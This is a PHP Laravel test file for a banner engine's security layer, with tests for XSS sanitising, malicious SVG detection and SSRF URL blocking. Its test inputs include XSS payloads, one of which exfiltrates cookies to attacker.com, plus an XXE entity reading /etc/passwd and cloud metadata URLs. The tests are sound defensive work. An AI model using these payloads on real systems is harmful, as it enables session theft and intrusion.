<?php

namespace Tests\Feature;

use App\Models\BannerTemplate;
use App\Services\BannerEngine\Analyzer\StructuralAnalysisEngine;
use App\Services\BannerEngine\FieldEngine\DynamicInjector;
use App\Services\BannerEngine\Security\SecurityHardener;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class BannerSecurityHardeningTest extends TestCase
{
    use RefreshDatabase;

    public function test_xss_script_injection_and_event_handlers_are_neutralized_in_dynamic_fields(): void
    {
        $rawHtml = <<<HTML
<div class="card">
    <h1 class="title">Original Title</h1>
    <p class="desc">Original Description</p>
    <a href="/original" class="cta-link">CTA Button</a>
</div>
HTML;

        $template = BannerTemplate::create([
            'name' => 'XSS Attack Test',
            'import_source' => BannerTemplate::SOURCE_HTML,
            'raw_html' => $rawHtml,
            'is_active' => true,
        ]);

        (new StructuralAnalysisEngine())->analyze($template);

        $injector = new DynamicInjector();
        $injected = $injector->inject($rawHtml, $template, [
            'headline' => '<script>alert(document.cookie)</script>Safe Organic Honey',
            'description' => '<img src=x onerror="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">Natural sweetness',
            'cta' => [
                'text' => 'Click <iframe src="http://evil.com"></iframe> Now',
                'url' => 'javascript:alert(document.domain)',
            ],
        ]);

        $this->assertStringNotContainsString('<script>', $injected);
        $this->assertStringNotContainsString('alert(document.cookie)', $injected);
        $this->assertStringNotContainsString('onerror=', $injected);
        $this->assertStringNotContainsString('<iframe', $injected);
        $this->assertStringNotContainsString('href="javascript:', $injected);
        $this->assertStringContainsString('Safe Organic Honey', $injected);
    }

    public function test_malicious_svg_with_xxe_and_embedded_scripts_is_rejected(): void
    {
        $hardener = new SecurityHardener();

        $cleanSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="green"/></svg>';
        $this->assertFalse($hardener->hasMaliciousSvgContent($cleanSvg));

        $xxeSvg = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>';
        $this->assertTrue($hardener->hasMaliciousSvgContent($xxeSvg));

        $scriptSvg = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>';
        $this->assertTrue($hardener->hasMaliciousSvgContent($scriptSvg));

        $onloadSvg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle r="10"/></svg>';
        $this->assertTrue($hardener->hasMaliciousSvgContent($onloadSvg));
    }

    public function test_ssrf_blocks_private_ips_and_cloud_metadata_endpoints(): void
    {
        $hardener = new SecurityHardener();

        // Dangerous / SSRF targets
        $this->assertFalse($hardener->validateUrlSafety('http://169.254.169.254/latest/meta-data/'));
        $this->assertFalse($hardener->validateUrlSafety('http://127.0.0.1:8000/admin/api'));
        $this->assertFalse($hardener->validateUrlSafety('http://localhost/admin'));
        $this->assertFalse($hardener->validateUrlSafety('http://192.168.1.100/config'));
        $this->assertFalse($hardener->validateUrlSafety('http://10.0.0.1/internal'));
        $this->assertFalse($hardener->validateUrlSafety('ftp://files.example.com/data'));

        // Safe targets
        $this->assertTrue($hardener->validateUrlSafety('/products/organic-apples'));
        $this->assertTrue($hardener->validateUrlSafety('https://images.unsplash.com/photo-12345.jpg'));
        $this->assertTrue($hardener->validateUrlSafety('https://cdn.example.com/media/banner.mp4'));
    }
}
